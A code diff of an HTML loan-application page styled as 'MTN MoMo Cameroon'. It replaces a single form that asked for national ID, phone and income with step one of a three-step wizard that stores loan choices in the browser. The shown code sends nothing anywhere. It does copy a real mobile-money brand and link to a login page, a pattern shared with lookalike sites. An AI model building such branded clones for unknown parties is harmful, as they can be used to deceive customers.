@@ -1,68 +1,65 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Apply for Loan – MTN MoMo Cameroon</title>
+    <title>MTN MoMo Loan - Application</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        html, body {
-            min-height: 100vh;
+        html,
+        body {
+            height: 100%;
             font-family: 'Inter', sans-serif;
-            background: #f0f2f5;
-            overflow-x: hidden;
+            background: #f5f5f5;
+            overflow: hidden;
         }
 
         body {
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding: 20px;
+            padding: 10px;
         }
 
-        /* ===== HEADER (same as index) ===== */
         header {
             width: 100%;
             max-width: 480px;
             padding: 15px 20px;
             display: flex;
-            justify-content: center;
+            justify-content: space-between;
             align-items: center;
+            margin-bottom: 10px;
             background: white;
             border-radius: 16px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-            margin-bottom: 15px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
             position: relative;
         }
 
         .back-btn {
-            font-size: 22px;
+            font-size: 28px;
             background: none;
             border: none;
             cursor: pointer;
-            color: #0047AB;
-            position: absolute;
-            left: 20px;
-            font-weight: 700;
-            text-decoration: none;
+            color: #333;
+            transition: transform 0.2s;
         }
 
+        .back-btn:hover {
+            transform: scale(1.1);
+        }
+
+        /* MoMo icon centered at top */
         .logo-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 8px;
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
         }
 
         .momo-icon {
@@ -71,7 +68,7 @@
             justify-content: center;
             background: #0047AB;
             color: #FFCC00;
-            font-weight: 800;
+            font-weight: 700;
             font-size: 18px;
             padding: 8px 18px;
             border-radius: 40px;
@@ -80,187 +77,174 @@
             box-shadow: 0 4px 12px rgba(0,71,171,0.25);
         }
 
-        /* ===== CARD ===== */
         .card {
             background: white;
             border-radius: 24px;
             padding: 30px 25px;
             width: 100%;
             max-width: 480px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            max-height: calc(100vh - 140px);
+        }
+
+        .form-title {
+            font-size: 24px;
+            font-weight: 700;
+            text-align: center;
+            color: #1a1a2e;
+            margin-bottom: 5px;
+        }
+
+        .form-title .highlight {
+            color: #0047AB;
+        }
+
+        .form-subtitle {
+            text-align: center;
+            color: #888;
+            font-size: 14px;
             margin-bottom: 15px;
         }
 
-        .page-title {
-            font-size: 22px;
-            font-weight: 800;
-            color: #1a1a2e;
+        .progress-bar {
+            width: 180px;
+            height: 6px;
+            background: #e0e0e0;
+            border-radius: 3px;
+            margin: 15px auto;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 33.33%;
+            height: 100%;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            transition: width 0.5s ease;
+        }
+
+        .step-text {
             text-align: center;
-            margin-bottom: 6px;
-        }
-
-        .page-subtitle {
-            font-size: 13px;
-            color: #888;
-            text-align: center;
-            margin-bottom: 22px;
-        }
-
-        /* ===== SUMMARY BOX ===== */
-        .summary-box {
-            background: #f8f9ff;
-            border-radius: 16px;
-            padding: 16px;
-            margin-bottom: 24px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .summary-item {
-            text-align: center;
-            flex: 1;
-        }
-
-        .summary-item .label {
-            font-size: 11px;
-            color: #888;
-            font-weight: 600;
-            display: block;
-            margin-bottom: 4px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .summary-item .value {
+            color: #777;
             font-size: 14px;
-            font-weight: 700;
-            color: #0047AB;
-        }
-
-        /* ===== FORM ===== */
-        .form-section-title {
-            font-size: 13px;
-            font-weight: 700;
-            color: #0047AB;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 12px;
-            margin-top: 20px;
-        }
-
-        .form-section-title:first-of-type {
-            margin-top: 0;
+            margin-bottom: 20px;
+            font-weight: 500;
         }
 
         .form-group {
             margin-bottom: 16px;
         }
 
-        .form-group label {
+        .form-label {
             display: block;
-            font-size: 13px;
             font-weight: 600;
             color: #333;
-            margin-bottom: 6px;
+            margin-bottom: 4px;
+            font-size: 14px;
         }
 
-        .form-group input,
-        .form-group select {
+        .form-label .required {
+            color: #e74c3c;
+            margin-left: 2px;
+        }
+
+        .form-select,
+        .form-input,
+        .form-textarea {
             width: 100%;
             padding: 12px 14px;
-            border: 1.5px solid #e0e0e0;
+            border: 2px solid #e0e0e0;
             border-radius: 12px;
-            font-size: 14px;
+            font-size: 15px;
+            transition: border-color 0.3s, box-shadow 0.3s;
             font-family: 'Inter', sans-serif;
-            color: #1a1a2e;
-            background: #fff;
-            transition: border-color 0.2s, box-shadow 0.2s;
+            background: white;
+            color: #333;
+        }
+
+        .form-select:focus,
+        .form-input:focus,
+        .form-textarea:focus {
+            border-color: #0047AB;
             outline: none;
+            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.1);
         }
 
-        .form-group input:focus,
-        .form-group select:focus {
-            border-color: #0047AB;
-            box-shadow: 0 0 0 3px rgba(0,71,171,0.1);
+        .form-textarea {
+            resize: vertical;
+            min-height: 80px;
         }
 
-        .form-group input::placeholder {
-            color: #bbb;
+        .form-input::placeholder {
+            color: #aaa;
         }
 
-        .form-row {
-            display: flex;
-            gap: 12px;
+        /* ===== AMOUNT QUICK SELECT ===== */
+        .amount-quick {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-top: 8px;
         }
 
-        .form-row .form-group {
-            flex: 1;
-        }
-
-        .phone-input {
-            display: flex;
-            align-items: center;
-            border: 1.5px solid #e0e0e0;
+        .amount-quick button {
+            padding: 10px;
+            border: 2px solid #e0e0e0;
             border-radius: 12px;
-            overflow: hidden;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            background: #fff;
-        }
-
-        .phone-input:focus-within {
-            border-color: #0047AB;
-            box-shadow: 0 0 0 3px rgba(0,71,171,0.1);
-        }
-
-        .phone-prefix {
-            padding: 12px 12px;
-            background: #f8f9ff;
+            background: white;
             font-weight: 700;
-            font-size: 14px;
-            color: #0047AB;
-            border-right: 1.5px solid #e0e0e0;
-        }
-
-        .phone-input input {
-            border: none !important;
-            box-shadow: none !important;
-            flex: 1;
-        }
-
-        /* ===== CHECKBOX ===== */
-        .checkbox-group {
-            display: flex;
-            align-items: flex-start;
-            gap: 10px;
-            margin-top: 20px;
-            margin-bottom: 20px;
-        }
-
-        .checkbox-group input[type="checkbox"] {
-            width: 18px;
-            height: 18px;
-            margin-top: 2px;
-            accent-color: #0047AB;
+            font-size: 13px;
+            color: #1a1a2e;
             cursor: pointer;
-            flex-shrink: 0;
+            transition: all 0.2s;
+            font-family: 'Inter', sans-serif;
         }
 
-        .checkbox-group label {
+        .amount-quick button:hover {
+            border-color: #0047AB;
+            background: #f0f4ff;
+        }
+
+        .amount-quick button.active {
+            border-color: #0047AB;
+            background: #0047AB;
+            color: white;
+        }
+
+        .invalid {
+            border-color: #e74c3c !important;
+            box-shadow: 0 0 0 4px rgba(231, 76, 60, 0.1) !important;
+            animation: shake 0.4s ease;
+        }
+
+        @keyframes shake {
+            0%,
+            100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
+        }
+
+        .error-text {
+            color: #e74c3c;
             font-size: 12px;
-            color: #666;
-            line-height: 1.5;
-            cursor: pointer;
+            margin-top: 4px;
+            display: none;
+            font-weight: 500;
         }
 
-        .checkbox-group label a {
-            color: #0047AB;
-            font-weight: 600;
-            text-decoration: none;
+        .error-text.show {
+            display: block;
+            animation: slideDown 0.3s ease;
         }
 
-        /* ===== SUBMIT BUTTON ===== */
-        .submit-btn {
+        @keyframes slideDown {
+            0% { opacity: 0; transform: translateY(-5px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        .next-btn {
             width: 100%;
             padding: 16px;
             background: linear-gradient(135deg, #0047AB, #002D7A);
@@ -271,367 +255,216 @@
             font-weight: 700;
             cursor: pointer;
             transition: transform 0.2s, box-shadow 0.2s;
-            font-family: 'Inter', sans-serif;
+            margin-top: 10px;
         }
 
-        .submit-btn:hover {
+        .next-btn:hover {
             transform: scale(1.02);
-            box-shadow: 0 8px 25px rgba(0,71,171,0.3);
+            box-shadow: 0 8px 25px rgba(0, 71, 171, 0.3);
         }
 
-        .submit-btn:active {
+        .next-btn:active {
             transform: scale(0.98);
         }
 
-        .submit-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        /* ===== SUCCESS MODAL ===== */
-        .modal-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.5);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            z-index: 1000;
-        }
-
-        .modal-overlay.show {
-            display: flex;
-        }
-
-        .modal {
-            background: white;
-            border-radius: 24px;
-            padding: 32px 24px;
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-            animation: popIn 0.3s ease;
-        }
-
-        @keyframes popIn {
-            from { transform: scale(0.8); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
-
-        .modal-icon {
-            font-size: 56px;
-            margin-bottom: 16px;
-        }
-
-        .modal h2 {
-            font-size: 22px;
-            font-weight: 800;
-            color: #1a1a2e;
-            margin-bottom: 8px;
-        }
-
-        .modal p {
-            font-size: 14px;
-            color: #666;
-            line-height: 1.6;
-            margin-bottom: 24px;
-        }
-
-        .modal-btn {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #0047AB, #002D7A);
-            color: white;
-            border: none;
-            border-radius: 50px;
-            font-size: 15px;
-            font-weight: 700;
-            cursor: pointer;
-            font-family: 'Inter', sans-serif;
-        }
-
-        /* ===== BOTTOM NAV ===== */
-        .bottom-nav {
-            display: flex;
-            justify-content: space-around;
-            background: white;
-            border-radius: 16px;
-            padding: 12px;
-            width: 100%;
-            max-width: 480px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-        }
-
-        .nav-item {
-            text-align: center;
-            color: #999;
+        footer {
+            padding: 15px;
+            color: #aaa;
             font-size: 12px;
-            text-decoration: none;
-            cursor: pointer;
-            background: none;
-            border: none;
-            font-family: 'Inter', sans-serif;
-            transition: color 0.2s;
+            text-align: center;
+            margin-top: auto;
         }
-
-        .nav-item.active { color: #0047AB; font-weight: 600; }
-        .nav-item .icon { font-size: 22px; display: block; }
 
         @media (max-width: 480px) {
-            body { padding: 10px; }
-            .card { padding: 22px 18px; }
-            .form-row { flex-direction: column; gap: 0; }
-            .summary-box { flex-direction: column; gap: 12px; }
-            .summary-item { display: flex; justify-content: space-between; width: 100%; }
-            .summary-item .label { margin-bottom: 0; }
+            .card {
+                padding: 20px 16px;
+            }
+            .form-title {
+                font-size: 20px;
+            }
+            .form-input,
+            .form-select,
+            .form-textarea {
+                font-size: 14px;
+                padding: 10px 12px;
+            }
+            .amount-quick button {
+                font-size: 12px;
+                padding: 8px 4px;
+            }
         }
     </style>
 </head>
 <body>
-
-    <!-- ===== HEADER ===== -->
     <header>
-        <a href="index.html" class="back-btn">←</a>
+        <button class="back-btn" onclick="window.location.href='index.html'" aria-label="Go back">←</button>
         <div class="logo-container">
-            <div class="logo">
-                <span class="momo-icon">MoMo</span>
-            </div>
+            <span class="momo-icon">MoMo</span>
         </div>
+        <div style="width:28px;"></div>
     </header>
 
-    <!-- ===== APPLICATION CARD ===== -->
-    <div class="card">
-        <h1 class="page-title">Loan Application</h1>
-        <p class="page-subtitle">Fill in your details to complete your application</p>
+    <main class="card">
+        <h1 class="form-title">💰 Loan <span class="highlight">Application</span></h1>
+        <p class="form-subtitle">Step 1 of 3</p>
 
-        <!-- SUMMARY (auto-filled from index) -->
-        <div class="summary-box">
-            <div class="summary-item">
-                <span class="label">Amount</span>
-                <span class="value" id="summaryAmount">XAF 500,000</span>
-            </div>
-            <div class="summary-item">
-                <span class="label">Term</span>
-                <span class="value" id="summaryTerm">12 months</span>
-            </div>
-            <div class="summary-item">
-                <span class="label">Monthly</span>
-                <span class="value" id="summaryMonthly">XAF 43,958.33</span>
-            </div>
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        <div class="step-text">Tell us about your loan</div>
+
+        <!-- Loan Product -->
+        <div class="form-group">
+            <label class="form-label">Loan Product <span class="required">*</span></label>
+            <select class="form-select" id="loanType">
+                <option>Smart Loan</option>
+                <option>Xtra Cash</option>
+                <option>MoMo Boost</option>
+            </select>
         </div>
 
-        <form id="loanForm">
-
-            <!-- PERSONAL INFO -->
-            <div class="form-section-title">Personal Information</div>
-
-            <div class="form-group">
-                <label for="fullName">Full Name</label>
-                <input type="text" id="fullName" placeholder="e.g. Jean-Paul Mballa" required>
+        <!-- Loan Amount -->
+        <div class="form-group">
+            <label class="form-label">Loan Amount (XAF) <span class="required">*</span></label>
+            <input type="number" class="form-input" id="loanAmount" placeholder="500000" min="50000" max="1000000">
+            <div class="amount-quick">
+                <button onclick="setAmount(50000)">XAF 50K</button>
+                <button onclick="setAmount(100000)">XAF 100K</button>
+                <button onclick="setAmount(200000)">XAF 200K</button>
+                <button onclick="setAmount(350000)">XAF 350K</button>
+                <button onclick="setAmount(500000)">XAF 500K</button>
+                <button onclick="setAmount(1000000)">XAF 1M</button>
             </div>
-
-            <div class="form-row">
-                <div class="form-group">
-                    <label for="dob">Date of Birth</label>
-                    <input type="date" id="dob" required>
-                </div>
-                <div class="form-group">
-                    <label for="gender">Gender</label>
-                    <select id="gender" required>
-                        <option value="">Select</option>
-                        <option value="male">Male</option>
-                        <option value="female">Female</option>
-                    </select>
-                </div>
-            </div>
-
-            <div class="form-group">
-                <label for="idNumber">National ID Number</label>
-                <input type="text" id="idNumber" placeholder="e.g. 1234567890" required>
-            </div>
-
-            <!-- CONTACT INFO -->
-            <div class="form-section-title">Contact Information</div>
-
-            <div class="form-group">
-                <label for="phone">MoMo Phone Number</label>
-                <div class="phone-input">
-                    <span class="phone-prefix">+237</span>
-                    <input type="tel" id="phone" placeholder="6XX XXX XXX" pattern="[0-9 ]{9,12}" required>
-                </div>
-            </div>
-
-            <div class="form-group">
-                <label for="email">Email Address</label>
-                <input type="email" id="email" placeholder="you@example.com" required>
-            </div>
-
-            <div class="form-row">
-                <div class="form-group">
-                    <label for="region">Region</label>
-                    <select id="region" required>
-                        <option value="">Select region</option>
-                        <option>Adamawa</option>
-                        <option>Centre</option>
-                        <option>East</option>
-                        <option>Far North</option>
-                        <option>Littoral</option>
-                        <option>North</option>
-                        <option>Northwest</option>
-                        <option>South</option>
-                        <option>Southwest</option>
-                        <option>West</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label for="city">City / Town</label>
-                    <input type="text" id="city" placeholder="e.g. Douala" required>
-                </div>
-            </div>
-
-            <!-- EMPLOYMENT -->
-            <div class="form-section-title">Employment & Income</div>
-
-            <div class="form-group">
-                <label for="employment">Employment Status</label>
-                <select id="employment" required>
-                    <option value="">Select status</option>
-                    <option>Employed (Full-time)</option>
-                    <option>Employed (Part-time)</option>
-                    <option>Self-employed</option>
-                    <option>Business Owner</option>
-                    <option>Student</option>
-                    <option>Unemployed</option>
-                </select>
-            </div>
-
-            <div class="form-group">
-                <label for="income">Monthly Income (XAF)</label>
-                <input type="number" id="income" placeholder="e.g. 150000" min="0" required>
-            </div>
-
-            <!-- TERMS -->
-            <div class="checkbox-group">
-                <input type="checkbox" id="terms" required>
-                <label for="terms">
-                    I confirm that the information provided is accurate and I agree to the
-                    <a href="#" onclick="alert('Terms & Conditions')">Terms & Conditions</a> and
-                    <a href="#" onclick="alert('Privacy Policy')">Privacy Policy</a>.
-                </label>
-            </div>
-
-            <button type="submit" class="submit-btn" id="submitBtn">SUBMIT APPLICATION</button>
-        </form>
-    </div>
-
-    <!-- ===== BOTTOM NAV ===== -->
-    <div class="bottom-nav">
-        <button class="nav-item" onclick="window.location.href='index.html'">
-            <span class="icon">🏠</span>
-            Home
-        </button>
-        <button class="nav-item active">
-            <span class="icon">💰</span>
-            Apply
-        </button>
-        <button class="nav-item" onclick="window.location.href='login.html'">
-            <span class="icon">🔐</span>
-            Login
-        </button>
-    </div>
-
-    <!-- ===== SUCCESS MODAL ===== -->
-    <div class="modal-overlay" id="successModal">
-        <div class="modal">
-            <div class="modal-icon">✅</div>
-            <h2>Application Submitted!</h2>
-            <p>Your loan application has been received. We will review it and contact you via SMS within 24 hours.</p>
-            <button class="modal-btn" onclick="window.location.href='index.html'">Back to Home</button>
+            <div class="error-text" id="amountError">Please enter amount between XAF 50,000 and XAF 1,000,000</div>
         </div>
-    </div>
+
+        <!-- Loan Term -->
+        <div class="form-group">
+            <label class="form-label">Loan Term <span class="required">*</span></label>
+            <select class="form-select" id="loanTerm">
+                <option>3 Months</option>
+                <option>6 Months</option>
+                <option selected>12 Months</option>
+                <option>18 Months</option>
+                <option>24 Months</option>
+            </select>
+        </div>
+
+        <!-- Purpose of Loan -->
+        <div class="form-group">
+            <label class="form-label">Purpose of Loan <span class="required">*</span></label>
+            <textarea class="form-textarea" id="loanPurpose" placeholder="What will you use the loan for?"></textarea>
+            <div class="error-text" id="purposeError">Please describe the purpose (min 5 characters)</div>
+        </div>
+
+        <button class="next-btn" id="nextBtn">NEXT STEP →</button>
+    </main>
+
+    <footer>© 2026 MTN MoMo Cameroon</footer>
 
     <script>
         // ============================================
-        // LOAD LOAN DETAILS FROM INDEX PAGE (localStorage)
+        // PRE-FILL FROM INDEX PAGE
         // ============================================
-        const savedAmount = localStorage.getItem('loanAmount');
-        const savedTerm = localStorage.getItem('loanTerm');
-        const savedRepayment = localStorage.getItem('loanRepayment');
+        const storedAmount = localStorage.getItem('loanAmount');
+        const storedTerm = localStorage.getItem('loanTerm');
 
-        if (savedAmount) {
-            document.getElementById('summaryAmount').textContent =
-                'XAF ' + parseFloat(savedAmount).toLocaleString('en-US');
+        if (storedAmount) {
+            document.getElementById('loanAmount').value = storedAmount;
         }
-        if (savedTerm) {
-            const term = parseFloat(savedTerm);
-            document.getElementById('summaryTerm').textContent =
-                term + (term === 1 ? ' month' : ' months');
-        }
-        if (savedRepayment) {
-            document.getElementById('summaryMonthly').textContent = savedRepayment;
+        if (storedTerm) {
+            const termSelect = document.getElementById('loanTerm');
+            for (let option of termSelect.options) {
+                if (option.value === storedTerm + ' Months') {
+                    option.selected = true;
+                    break;
+                }
+            }
         }
 
         // ============================================
-        // FORM SUBMISSION
+        // AMOUNT QUICK SELECT
         // ============================================
-        const form = document.getElementById('loanForm');
-        const submitBtn = document.getElementById('submitBtn');
-        const successModal = document.getElementById('successModal');
+        function setAmount(amount) {
+            document.getElementById('loanAmount').value = amount;
+            document.getElementById('loanAmount').classList.remove('invalid');
+            document.getElementById('amountError').classList.remove('show');
 
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
+            document.querySelectorAll('.amount-quick button').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            event.target.classList.add('active');
+        }
 
-            // Basic validation
-            if (!form.checkValidity()) {
-                form.reportValidity();
+        // ============================================
+        // NEXT BUTTON HANDLER
+        // ============================================
+        document.getElementById('nextBtn').addEventListener('click', function() {
+            const amount = document.getElementById('loanAmount').value.trim();
+            const purpose = document.getElementById('loanPurpose').value.trim();
+            const amountInput = document.getElementById('loanAmount');
+            const purposeInput = document.getElementById('loanPurpose');
+            const amountError = document.getElementById('amountError');
+            const purposeError = document.getElementById('purposeError');
+
+            let valid = true;
+
+            // Reset errors
+            amountInput.classList.remove('invalid');
+            purposeInput.classList.remove('invalid');
+            amountError.classList.remove('show');
+            purposeError.classList.remove('show');
+
+            // Validate amount (XAF 50,000 - XAF 1,000,000)
+            if (!amount || parseFloat(amount) < 50000 || parseFloat(amount) > 1000000) {
+                amountInput.classList.add('invalid');
+                amountError.classList.add('show');
+                valid = false;
+            }
+
+            // Validate purpose
+            if (!purpose || purpose.length < 5) {
+                purposeInput.classList.add('invalid');
+                purposeError.classList.add('show');
+                valid = false;
+            }
+
+            if (!valid) {
+                const firstError = document.querySelector('.invalid');
+                if (firstError) {
+                    firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    firstError.focus();
+                }
                 return;
             }
 
-            // Disable button while "processing"
-            submitBtn.disabled = true;
-            submitBtn.textContent = 'SUBMITTING...';
+            // Save to localStorage
+            localStorage.setItem('loanType', document.getElementById('loanType').value);
+            localStorage.setItem('loanAmount', amount);
+            localStorage.setItem('loanTerm', document.getElementById('loanTerm').value.replace(' Months', ''));
+            localStorage.setItem('loanPurpose', purpose);
 
-            // Collect form data (in a real app, send to backend here)
-            const applicationData = {
-                fullName: document.getElementById('fullName').value,
-                dob: document.getElementById('dob').value,
-                gender: document.getElementById('gender').value,
-                idNumber: document.getElementById('idNumber').value,
-                phone: '+237' + document.getElementById('phone').value,
-                email: document.getElementById('email').value,
-                region: document.getElementById('region').value,
-                city: document.getElementById('city').value,
-                employment: document.getElementById('employment').value,
-                income: document.getElementById('income').value,
-                loanAmount: savedAmount || '500000',
-                loanTerm: savedTerm || '12',
-                monthlyPayment: savedRepayment || 'XAF 43,958.33',
-                submittedAt: new Date().toISOString()
-            };
-
-            console.log('Application submitted:', applicationData);
-
-            // Save locally (demo). In production, POST to your backend.
-            localStorage.setItem('lastApplication', JSON.stringify(applicationData));
-
-            // Simulate network delay
-            setTimeout(function() {
-                successModal.classList.add('show');
-            }, 800);
+            // Navigate to details page
+            window.location.href = 'details.html';
         });
 
-        // Format phone input (digits and spaces only)
-        document.getElementById('phone').addEventListener('input', function(e) {
-            this.value = this.value.replace(/[^0-9 ]/g, '');
+        // ============================================
+        // REAL-TIME VALIDATION
+        // ============================================
+        document.getElementById('loanAmount').addEventListener('input', function() {
+            const val = parseFloat(this.value);
+            if (val >= 50000 && val <= 1000000) {
+                this.classList.remove('invalid');
+                document.getElementById('amountError').classList.remove('show');
+            }
         });
 
-        console.log('====================================');
-        console.log('💰 MTN MoMo Loan – Cameroon');
-        console.log('📝 Application Page Loaded');
-        console.log('====================================');
+        document.getElementById('loanPurpose').addEventListener('input', function() {
+            if (this.value.trim().length >= 5) {
+                this.classList.remove('invalid');
+                document.getElementById('purposeError').classList.remove('show');
+            }
+        });
     </script>
-
 </body>
 </html>
